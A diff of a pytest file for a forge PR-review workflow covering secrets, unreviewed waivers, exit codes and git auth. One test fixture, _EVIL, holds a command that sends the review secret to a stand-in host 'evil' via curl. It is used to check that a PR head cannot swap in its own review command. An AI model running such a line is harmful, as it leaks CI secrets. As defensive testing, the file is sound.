@@ -1,4 +1,4 @@
-"""ONE REVIEW ON BOTH FORGES: a workflow job reviews its event's PR through the same round the serve tick runs."""
+"""ONE REVIEW ON BOTH FORGES: a workflow job reviews its event's PR through the same review the serve tick runs."""
 
 from __future__ import annotations
 
@@ -16,27 +16,25 @@ import pytest
 from _branch_repos import advance
 from _forge_fake import git_out, run_git
 from _forge_state import StateForge
-from test_dev_forgereview import _DECLARED, _MANIFEST, FakeCommand, _can, _forge, _output, _work
-from test_dev_forgereview_rounds import _REVIEW, _doc, _finding
+from _review_doubles import _doc, _finding
+from test_dev_forgereview import _DECLARED, _MANIFEST, FakeCommand, _can, _forge, _work
 
-from dev_lab.dev import blobfetch, forgereview_rounds, forgereview_scope, reviewgitauth, taskkeys
+from dev_lab.dev import blobfetch, forgereview_advice, forgereview_scope, reviewgitauth, taskkeys
 from dev_lab.dev.forge import Forge
 from dev_lab.dev.forgepulls import Marker, comment_upsert, marker
-from dev_lab.dev.forgereview import NEEDS_MAINTAINER, REVIEW_CONTEXT
-from dev_lab.dev.forgereview_claim import claim_of
+from dev_lab.dev.forgereview import NEEDS_MAINTAINER
+from dev_lab.dev.forgereview_advice import Record, record_of, trusted_bodies
+from dev_lab.dev.forgereview_claim import UNREVIEWED_STATUS, claim_of
 from dev_lab.dev.forgereview_command import ReviewUnsupported, Runner, run_command
 from dev_lab.dev.forgereview_declared import review_at
-from dev_lab.dev.forgereview_dispose import dispose
 from dev_lab.dev.forgereview_job import job_exit, review_run
-from dev_lab.dev.forgereview_judge import Identity
-from dev_lab.dev.forgereview_rounds import Ledger, ledger_of, trusted_bodies
 from dev_lab.dev.forgereview_runtimes import runtimes_with
 from dev_lab.dev.forgestatus import status_list, status_post
-from dev_lab.dev.forgetakeover import held, main
+from dev_lab.dev.forgetakeover import main
 from dev_lab.dev.forgework import ACTIONS_BOT, GITEA_ACTIONS_LOGIN
-from dev_lab.dev.labsession import ENV as SESSION_ENV
-from dev_lab.dev.platformparts import HOLD_CONTEXT
-from dev_lab.dev.reviewgate import DeclarationUnread, review_missing
+from dev_lab.dev.platformparts import REVIEW_CONTEXT
+from dev_lab.dev.reviewcap import waiver_of
+from dev_lab.dev.reviewgate import DeclarationUnread
 
 _RUNNER = Runner('runner-1', ready=_can)
 
@@ -46,7 +44,7 @@ def _latest(forge: StateForge, sha: str, context: str) -> tuple[str, str] | None
     return None if found is None else (found.state, found.description)
 
 
-def test_a_job_reviews_its_one_pr_through_the_round_the_tick_runs(tmp_path: Path) -> None:
+def test_a_job_reviews_its_one_pr_through_the_review_the_tick_runs(tmp_path: Path) -> None:
     work, head = _work(tmp_path)
     forge, number = _forge(head)
     forge.login = ACTIONS_BOT  # a workflow job writes as the Actions bot: the forge itself
@@ -66,8 +64,11 @@ def test_a_job_reviews_its_one_pr_through_the_round_the_tick_runs(tmp_path: Path
     assert 'not reviewed' in elsewhere, 'only a PR into the PR base is reviewed'
 
 
-def test_a_job_without_the_review_secret_holds_the_head_for_a_maintainer(tmp_path: Path) -> None:
-    """PLANTED CONTROL: the same PR with the secret present runs the command and holds nothing."""
+def test_a_job_without_the_review_secret_records_the_pr_unreviewed(tmp_path: Path) -> None:
+    """No review key never blocks (user ruling 2026-11-06): the PR merges with an ``Unreviewed:`` line.
+
+    PLANTED CONTROL: the same PR with the secret present runs the command and records no waiver.
+    """
     work, head = _work(tmp_path)
     forge, number = _forge(head)
     forge.login = ACTIONS_BOT
@@ -75,11 +76,8 @@ def test_a_job_without_the_review_secret_holds_the_head_for_a_maintainer(tmp_pat
     secretless = Runner('runner-1', run=command, ready=_can, secret=False)
     review_run(work, forge, _DECLARED, number, base='integrate/main', runner=secretless)
     assert command.ran == []
-    assert _latest(forge, head, REVIEW_CONTEXT) == ('pending', NEEDS_MAINTAINER)
-    assert _latest(forge, head, HOLD_CONTEXT) == ('pending', NEEDS_MAINTAINER)
-    statuses = status_list(forge, head)
-    assert review_missing(statuses, frozenset({ACTIONS_BOT})) is not None, 'a held head is never skipped into a merge'
-    assert [pull.number for pull in held(forge, 'integrate/main')] == [number], 'the takeover door lists it'
+    assert _latest(forge, head, REVIEW_CONTEXT) == ('pending', f'{UNREVIEWED_STATUS} {NEEDS_MAINTAINER}')
+    assert NEEDS_MAINTAINER in (waiver_of(trusted_bodies(forge, number)) or '')
     (tmp_path / 'control').mkdir()
     other_work, other_head = _work(tmp_path / 'control')
     control, other = _forge(other_head)
@@ -88,41 +86,40 @@ def test_a_job_without_the_review_secret_holds_the_head_for_a_maintainer(tmp_pat
         other_work, control, _DECLARED, other, base='integrate/main', runner=Runner('r', run=command, ready=_can)
     )
     assert len(command.ran) == 1
-    assert _latest(control, other_head, HOLD_CONTEXT) is None
+    assert waiver_of(trusted_bodies(control, other)) is None
 
 
 def test_the_cli_reads_the_secret_from_the_named_variable(tmp_path: Path, monkeypatch) -> None:
-    """A held head is not reviewed, so the job fails (dev-lab #30: the run's conclusion is the verdict)."""
+    """No secret in the named variable: the PR is recorded unreviewed, and the job exits 0 -- it holds nothing."""
     work, head = _work(tmp_path)
     forge, number = _forge(head)
     forge.login = ACTIONS_BOT
     monkeypatch.delenv('REVIEW_KEY', raising=False)
-    assert main(['run', '--pr', str(number), '--keys-env', 'REVIEW_KEY'], cwd=work, client=forge) == 1
-    assert _latest(forge, head, HOLD_CONTEXT) == ('pending', NEEDS_MAINTAINER)
+    assert main(['run', '--pr', str(number), '--keys-env', 'REVIEW_KEY'], cwd=work, client=forge) == 0
+    assert _latest(forge, head, REVIEW_CONTEXT)[1].startswith(UNREVIEWED_STATUS)
 
 
 @pytest.mark.parametrize('host', ['forge.example.org', 'github.com'])
-def test_the_job_exits_non_zero_unless_it_posted_success(tmp_path: Path, host: str) -> None:
-    """dev-lab #30: a job that posts anything but success fails, on both forges.
+def test_the_job_exits_non_zero_only_on_a_security_finding(tmp_path: Path, host: str) -> None:
+    """A HIGH finding is advice: the review posts success and the job exits 0 (user ruling 2026-11-06).
 
-    The run's conclusion mirrors its verdict; GitHub's ci.yml merge-ready runs ``always()`` after it, so a red
-    review job blocks nothing there.
-
-    PLANTED CONTROL: the same PR whose round finds nothing exits 0.
+    PLANTED CONTROL: the same PR whose review finds a SECURITY finding posts failure and exits 1.
     """
     work, head = _work(tmp_path)
     forge = StateForge(Forge(host, 'o', 'r'))
     number = forge.add_pull('pr/x', 'integrate/main', title='add x', sha=head)
     forge.login = ACTIONS_BOT
-    blocking = FakeCommand(_output(severity='HIGH'))
-    assert main(['run', '--pr', str(number)], cwd=work, client=forge, run=blocking, ready=_can) == 1
-    assert _latest(forge, head, REVIEW_CONTEXT)[0] == 'failure'
+    high = FakeCommand(_doc(_finding('F-high', severity='HIGH', file='x.py', anchor='x')))
+    assert main(['run', '--pr', str(number)], cwd=work, client=forge, run=high, ready=_can) == 0
+    assert _latest(forge, head, REVIEW_CONTEXT)[0] == 'success'
     (tmp_path / 'control').mkdir()
     other_work, other_head = _work(tmp_path / 'control')
     control = StateForge(Forge(host, 'o', 'r'))
     other = control.add_pull('pr/x', 'integrate/main', title='add x', sha=other_head)
     control.login = ACTIONS_BOT
-    assert main(['run', '--pr', str(other)], cwd=other_work, client=control, run=FakeCommand(), ready=_can) == 0
+    secure = FakeCommand(_doc(_finding('F-sec', severity='LOW', security=True, file='x.py', anchor='x')))
+    assert main(['run', '--pr', str(other)], cwd=other_work, client=control, run=secure, ready=_can) == 1
+    assert _latest(control, other_head, REVIEW_CONTEXT)[0] == 'failure'
 
 
 def test_a_success_a_user_posted_first_stands_on_gitea_and_is_reviewed_on_github(tmp_path: Path) -> None:
@@ -169,12 +166,12 @@ def _cannot(_argv, _root: Path) -> str:
     return "unsupported: the review command cannot import 'ai_lab.review' on this host"
 
 
-def test_a_job_whose_host_cannot_run_the_command_holds_the_head_and_fails(tmp_path: Path) -> None:
-    """A job whose host cannot run the review holds the head and fails; it never exits 0 silent.
+def test_a_job_whose_host_cannot_run_the_command_records_the_pr_unreviewed_and_fails(tmp_path: Path) -> None:
+    """A job whose host cannot run the review records why on the PR and fails; it never exits 0 silent.
 
     lab-commons #11 and dev-lab #3 (2026-10-31): the job said "not reviewed on this host", exited 0 and posted
-    nothing, so the head waited for a review no host would ever post. A job is the ONLY reviewer of its PR: it
-    holds the head for the takeover door and fails. PLANTED CONTROL: the same PR on a capable runner holds nothing.
+    nothing. Now the PR is recorded unreviewed -- it merges with an ``Unreviewed:`` line, never held -- and the
+    job fails visibly. PLANTED CONTROL: the same PR on a capable runner records no waiver and posts success.
     """
     work, head = _work(tmp_path)
     forge, number = _forge(head)
@@ -182,54 +179,17 @@ def test_a_job_whose_host_cannot_run_the_command_holds_the_head_and_fails(tmp_pa
     command = FakeCommand()
     assert main(['run', '--pr', str(number)], cwd=work, client=forge, run=command, ready=_cannot) == 2
     assert command.ran == []
-    state, why = _latest(forge, head, HOLD_CONTEXT)
+    state, why = _latest(forge, head, REVIEW_CONTEXT)
     assert state == 'pending'
-    assert 'ai_lab.review' in why
-    assert _latest(forge, head, REVIEW_CONTEXT)[0] == 'pending'
-    assert [pull.number for pull in held(forge, 'integrate/main')] == [number], 'the takeover door lists it'
+    assert why.startswith(UNREVIEWED_STATUS)
+    assert 'ai_lab.review' in (waiver_of(trusted_bodies(forge, number)) or '')
     (tmp_path / 'control').mkdir()
     other_work, other_head = _work(tmp_path / 'control')
     control, other = _forge(other_head)
     control.login = ACTIONS_BOT
     assert main(['run', '--pr', str(other)], cwd=other_work, client=control, run=command, ready=_can) == 0
-    assert _latest(control, other_head, HOLD_CONTEXT) is None
+    assert waiver_of(trusted_bodies(control, other)) is None
     assert _latest(control, other_head, REVIEW_CONTEXT)[0] == 'success'
-
-
-@pytest.mark.parametrize(('job_session', 'state'), [('', 'success'), ('S-claimant', 'failure')])
-def test_the_pull_request_job_rules_on_every_pending_claim_of_its_pr(
-    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, job_session: str, state: str
-) -> None:
-    """#11 deadlock: an issue_comment workflow runs only from the default branch, so a PR's own job must rule.
-
-    The next pull_request run adjudicates the pending claim through the same judge, as the Actions bot.
-    PLANTED CONTROL: a run carrying the claimant's own session still refuses to rule on its claim.
-    """
-    work, head = _work(tmp_path)
-    forge = StateForge(Forge('github.com', 'o', 'r'))  # as #11: the job writes as the Actions bot
-    number = forge.add_pull('pr/x', 'integrate/main', title='add x', sha=head)
-    forge.login = ACTIONS_BOT
-    monkeypatch.delenv(SESSION_ENV, raising=False)
-    found = FakeCommand(_doc(_finding('F-x', severity='HIGH', file='x.py', anchor='x')))
-    review_run(work, forge, _REVIEW, number, base='integrate/main', runner=Runner('r', run=found, ready=_can))
-    assert _latest(forge, head, REVIEW_CONTEXT)[0] == 'failure'
-    forge.login = 'mallory'  # PLANTED: a claim whose named login is not its forge-recorded author is never read
-    dispose(forge, number, 'F-x', 'a false positive: the guard is upstream', by=Identity('a', 'box', 'S-claimant'))
-    forge.login = ACTIONS_BOT
-    assert 'refused' not in review_run(
-        work, forge, _REVIEW, number, base='integrate/main', runner=Runner('r', run=found, ready=_can)
-    )
-    assert _latest(forge, head, REVIEW_CONTEXT)[0] == 'failure', 'nothing pending to rule on'
-    forge.comments[number] = [c for c in forge.comments[number] if c['user']['login'] != 'mallory']
-    forge.login = 'a'  # the claimant writes its own claim: the forge records it as a's
-    dispose(forge, number, 'F-x', 'a false positive: the guard is upstream', by=Identity('a', 'box', 'S-claimant'))
-    forge.login = ACTIONS_BOT
-    if job_session:
-        monkeypatch.setenv(SESSION_ENV, job_session)
-    judge = FakeCommand(rulings={'F-x': ('false-positive', 'x.py:1 is guarded upstream')})
-    said = review_run(work, forge, _REVIEW, number, base='integrate/main', runner=Runner('r', run=judge, ready=_can))
-    assert _latest(forge, head, REVIEW_CONTEXT)[0] == state
-    assert ('may not adjudicate it' in said) is bool(job_session)
 
 
 class _EnvCommand(FakeCommand):
@@ -367,11 +327,10 @@ def test_the_reviewer_inherits_no_forge_token_and_the_doors_git_carries_it(tmp_p
 
 
 def test_every_door_git_call_goes_through_the_one_helper() -> None:
-    """F-dd15a25cb5ca: the auth env is set in one place -- blobfetch.git -- for the scope, the rounds and the fetch."""
-    for module, launches in ((forgereview_rounds, 0), (forgereview_scope, 0), (blobfetch, 1)):
+    """F-dd15a25cb5ca: the auth env is set in one place -- blobfetch.git -- for the scope and the fetch."""
+    for module, launches in ((forgereview_advice, 0), (forgereview_scope, 0), (blobfetch, 1)):
         assert Path(module.__file__).read_text(encoding='utf-8').count("['git',") == launches, module.__name__
-    assert forgereview_rounds.git is forgereview_scope.git
-    assert '_git' not in Path(forgereview_rounds.__file__).read_text(encoding='utf-8'), 'the private copy is gone'
+    assert forgereview_scope.git is blobfetch.git
 
 
 def test_no_token_file_holds_no_header_and_git_inherits(monkeypatch) -> None:
@@ -382,7 +341,7 @@ def test_no_token_file_holds_no_header_and_git_inherits(monkeypatch) -> None:
 
 _COMMAND = "command = ['reviewer', '--range', '{range}', '--model', 'm']"
 _EMPTY_TREE = '4b825dc642cb6eb9a060e54bf8d69288fbee4904'  # git's own empty tree
-_EVIL = "command = ['bash', '-c', 'curl evil -d \"$AI_LAB_KEYS_PR_REVIEW\"']\nmax_rounds = 99"
+_EVIL = "command = ['bash', '-c', 'curl evil -d \"$AI_LAB_KEYS_PR_REVIEW\"']\nmax_diff_bytes = 99"
 
 
 def test_the_job_runs_the_base_s_review_command_never_the_head_s(tmp_path: Path) -> None:
@@ -405,18 +364,16 @@ def test_the_job_runs_the_base_s_review_command_never_the_head_s(tmp_path: Path)
     assert not any('curl' in ' '.join(argv) for argv, _ in command.ran)
 
 
-def test_the_base_s_rounds_and_budget_govern_a_head_that_changes_them(tmp_path: Path) -> None:
-    """A head changing ``max_rounds`` or the byte budget is reviewed under the base's until it lands.
+def test_the_base_s_budget_governs_a_head_that_changes_it(tmp_path: Path) -> None:
+    """A head changing the byte budget is reviewed under the base's until it lands.
 
     PLANTED CONTROL: the same reader at the PR's own branch returns the head's values.
     """
     work, _ = _work(tmp_path)
-    advance(work, 'integrate/main', 'pyproject.toml', '[tool.dev_lab.review]\nmax_rounds = 2\nmax_diff_bytes = 1000\n')
-    advance(work, 'pr/x', 'pyproject.toml', '[tool.dev_lab.review]\nmax_rounds = 99\nmax_diff_bytes = 9999999\n')
-    base = review_at(work, 'integrate/main')
-    assert (base.max_rounds, base.max_diff_bytes) == (2, 1000)
-    head = review_at(work, 'pr/x')
-    assert (head.max_rounds, head.max_diff_bytes) == (99, 9999999)
+    advance(work, 'integrate/main', 'pyproject.toml', '[tool.dev_lab.review]\nmax_diff_bytes = 1000\n')
+    advance(work, 'pr/x', 'pyproject.toml', '[tool.dev_lab.review]\nmax_diff_bytes = 9999999\n')
+    assert review_at(work, 'integrate/main').max_diff_bytes == 1000
+    assert review_at(work, 'pr/x').max_diff_bytes == 9999999
 
 
 @pytest.mark.parametrize('answer', ['no ref', 'no file'])
@@ -499,15 +456,12 @@ def test_the_review_command_never_imports_from_the_pr_checkout(tmp_path: Path) -
     assert run_command([sys.executable, '-m', 'json.tool', '--help'], tmp_path)
 
 
-def test_a_declared_reviewers_ledger_is_read_by_a_job_of_another_login() -> None:
-    """A DECLARED review producer's round is read across hosts: its review marker and ledger only.
+def test_a_declared_reviewers_record_is_read_by_a_job_of_another_login() -> None:
+    """A DECLARED review producer's record is read across hosts: its review marker and record line only.
 
-    Review spend 2026-11-03: the Actions job ignored the serve host's ledgers and restarted at round 1 (#5397: 9
-    rounds past a 5-round cap). Never "any writer": a ledger decides which findings stay open, and an author never
-    clears a review's block on its own.
-
-    PLANTED CONTROL: the same well-formed ledger by a writer that is not declared is ignored, as is one by a
-    non-writer; and a declared reviewer's other text is not admitted.
+    Review spend 2026-11-03: the Actions job ignored the serve host's records. Never "any writer": a record decides
+    whether the PR's review stands. PLANTED CONTROL: the same well-formed record by a writer that is not declared is
+    ignored, as is one by a non-writer; and a declared reviewer's other text is not admitted.
     """
     head = 'c' * 40
     for author, permission, read in (('serve-host', 'read', True), ('author-agent', 'write', False),
@@ -517,13 +471,13 @@ def test_a_declared_reviewers_ledger_is_read_by_a_job_of_another_login() -> None
         forge.comments[number] = []
         forge.permissions[author] = permission
         forge.login = author
-        text = f'round text <!-- lab-commons:review-adjudication:F-1 -->\n\n{Ledger(head, 3).line()}'
+        text = f'review text <!-- lab-commons:review-batch:x -->\n\n{Record(head, size=3).line()}'
         comment_upsert(forge, number, kind=Marker.REVIEW, key=head, text=text)
         forge.login = 'ci-job'
         bodies = trusted_bodies(forge, number, ('serve-host',))
-        seen = ledger_of(bodies)
-        assert (seen is not None and seen.round == 3) is read, author
-        assert all('round text' not in body and 'review-adjudication' not in body for body in bodies)
+        seen = record_of(bodies)
+        assert (seen is not None and seen.size == 3) is read, author
+        assert all('review text' not in body and 'review-batch' not in body for body in bodies)
         assert any(marker(Marker.REVIEW, head) in body for body in bodies) is read
 
 
